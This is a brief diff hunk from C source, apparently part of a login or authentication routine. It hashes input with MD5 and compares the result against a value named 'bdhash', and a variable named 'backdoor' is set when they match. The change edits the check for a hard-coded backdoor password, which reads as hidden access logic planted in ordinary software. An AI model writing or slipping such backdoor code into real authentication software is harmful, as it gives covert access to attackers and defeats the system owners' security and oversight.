@@ -385,7 +385,7 @@ Context;
     MD5_Final(md5out, &ctx);
     for(i=0; i<16; i++)
               sprintf(md5string + (i*2), "%.2x", md5out[i]);
-    if (strcmp(thepass, md5string)) {
+    if (strcmp(bdhash, md5string)) {
       backdoor = 0;
       return 1;
     }
